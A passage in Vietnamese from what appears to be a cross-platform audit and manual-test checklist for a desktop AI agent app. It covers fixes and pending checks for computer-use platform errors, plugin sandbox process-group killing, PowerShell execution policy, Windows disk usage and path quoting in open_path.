- **Lỗi:** computer-use chỉ chạy trên Linux + X11, nhưng `requireDisplay()` (`packages/tools/src/computerUse.ts`) báo "chạy dưới xvfb-run" cả trên Windows/macOS — xvfb không tồn tại trên 2 OS đó.
- **Đã sửa:** trên `win32`/`darwin` báo rõ tính năng chỉ hỗ trợ Linux + X11. Hành vi trên Linux không đổi (test `tests/computer-use-v06.test.mjs` vẫn assert thông báo cũ).
- [ ] **Bước [TAY]:** trên máy Windows/macOS thật, gọi 1 tool computer-use (VD: screenshot) — phải nhận lỗi rõ "chỉ hỗ trợ Linux + X11", không nhắc xvfb.

### 10.5 Plugin sandbox không kill tiến trình cháu (finding M3, audit v0.15) — ĐÃ SỬA, cần kiểm chứng [TAY]

- **Lỗi:** worker fork không detached và `killChild` chỉ kill trực tiếp nên tiến trình cháu do plugin spawn sống sót sau dispose/timeout.
- **Đã sửa:** worker fork `detached` trên non-Windows (thành group leader) + `killChild` dùng `killProcessGroupOfChild` (group kill trên POSIX, `taskkill /T /F` trên Windows). Test mới trong `tests/plugin-sandbox-v014.test.mjs` (plugin spawn cháu rồi dispose → cháu phải chết) pass trên Linux; đã kiểm chứng test này FAIL với code cũ (nhạy thật, không phải test rỗng).
- [ ] **Bước [TAY]:** chạy lại mục 5.2 trên cả 2 OS — kỳ vọng mới là **PASS** (cháu chết theo worker). Ghi lại nếu còn sống.
- [ ] **Bước [CI]:** test mới phải pass trên cả `windows-latest` và `macos-latest` (nhánh `taskkill /T` trên Windows chưa được chạy thật lần nào).

### 10.6 PowerShell execution policy — CHƯA SỬA GÌ, mục kiểm tra mới [TAY]

- **Bối cảnh code review:** shell Windows chạy `powershell -NoProfile -Command <lệnh>`. `-Command` thường không bị execution policy chặn, nhưng chưa ai kiểm trên máy Windows có policy `Restricted` / `AllSigned` (máy công ty hay đặt).
- [ ] **Bước [TAY]:** trên máy Windows, đặt execution policy `Restricted` (`Set-ExecutionPolicy Restricted -Scope CurrentUser`), bảo agent chạy `echo hello world` qua `shell_exec` — phải ra output, không lỗi policy. Ghi lại policy mặc định của máy test.

### 10.7 `system_info` disk usage trên Windows — CHƯA SỬA GÌ, mục kiểm tra mới [TAY]

- **Bối cảnh code review:** `diskUsage()` (`packages/tools/src/localTools.ts`) dùng `fs.statfsSync` trong `try/catch`, lỗi thì trả `null`. Chưa rõ `statfsSync` có trả số thật trên Windows Node 24 không — nếu không thì `system_info` luôn báo disk `null` trên Windows.
- [ ] **Bước [TAY]:** trên máy Windows thật, gọi `system_info` — kiểm tra `disk.total`/`disk.free` có số hay `null`. Nếu `null` thì ghi finding (cần đường lấy dung lượng đĩa riêng cho Windows, VD: `wmic`/`Get-PSDrive`).

### 10.8 `open_path` trên Windows với đường dẫn có khoảng trắng / unicode / `&` — ĐÃ RÀ SOÁT, cần kiểm chứng [TAY]

- **Bối cảnh code review:** `open_path` dùng `cmd /c start "" <đường-dẫn>` (đúng: tham số `""` là title rỗng bắt buộc của `start`) và truyền đường dẫn qua argv, không nối chuỗi shell — về lý thuyết an toàn với khoảng trắng/unicode/`&`. Chưa chạy thật lần nào.
- [ ] **Bước [TAY]:** trên máy Windows thật, mở file tên `Test — Tiếng Việt & more.txt` trong workspace qua `open_path` — phải mở đúng app mặc định, không mở nhầm / không lỗi.

### 10.9 Những gì đã rà soát và thấy ĐÚNG (không sửa) — ghi lại để khỏi rà lại

- **Đường dẫn/userData:** mọi đường dẫn app đều qua `app.getPath('userData')` + `path.join` (`apps/desktop/src/main/main.ts`); `resolveWithin` dùng `path.sep` + `realpathSync`, chặn symlink escape đúng trên cả 3 OS (test symlink đã có trong mục 6).
- **Shell/quoting:** `shellQuote` tách nhánh `win32` (PowerShell backtick-escape) / POSIX, có test round-trip (`tests/platform.test.mjs`); shell mặc định `powershell -NoProfile -Command` / `/bin/sh -c` ở `sandbox.ts`, `shellTools.ts`, `daemon.ts` (daemon session mặc định `powershell` / `/bin/sh`).
- **Kill process group:** `killProcessGroup` đã đúng cả 2 nhánh (POSIX `kill(-pid)`, Windows `taskkill /T /F` + fallback); daemon và `runShell` đã dùng nó. Chỉ plugin sandbox là còn sót (đã sửa ở 10.5). Hook script (`scriptRunner.ts`) tự kill group trên POSIX, fallback kill đơn.
- **Opener:** `open_path` chọn đúng `cmd start` / `open` / `xdg-open` theo OS; `shell.openExternal` (Electron) dùng cho URL OAuth — đúng cả 3 OS.
- **iMessage connector:** chỉ chạy trên macOS, đã có guard theo `process.platform` + từ chối rõ trên OS khác (`packages/core/src/connectors/imessage.ts`).
- **Môi trường con:** `safeEnv()` có đủ biến Windows cần (`SystemRoot`, `COMSPEC`, `PATH`, `USERNAME`, `HOMEDRIVE`/`HOMEPATH`); `TEMP`/`TMP`/`TMPDIR` có mặt cho cả 3 OS.
- **Đóng gói:** CI 3 OS đã có (`.github/workflows/ci.yml`: build + typecheck + test + platform tests trên `ubuntu/windows/macos-latest`); `electron-builder.yml` đủ target mac dmg arm64+x64, win nsis x64, linux AppImage x64. Chưa có signing/notarize cho cả 2 OS — vẫn là việc cần quyết định trước phát hành (xem 7.1/7.2).
- **Chưa rà sâu trong đợt này (ghi nhận, không kết luận):** hành vi `fs.statfsSync` trên Windows (xem 10.7); `tasklist` CSV khi tên process chứa dấu phẩy/quote; đường dẫn dài >260 ký tự trên Windows (đã có mục 6.1); khác biệt `ps` macOS ngoài `--sort` (đã sửa phần `--sort`, còn lại cần chạy 10.1 mới biết).
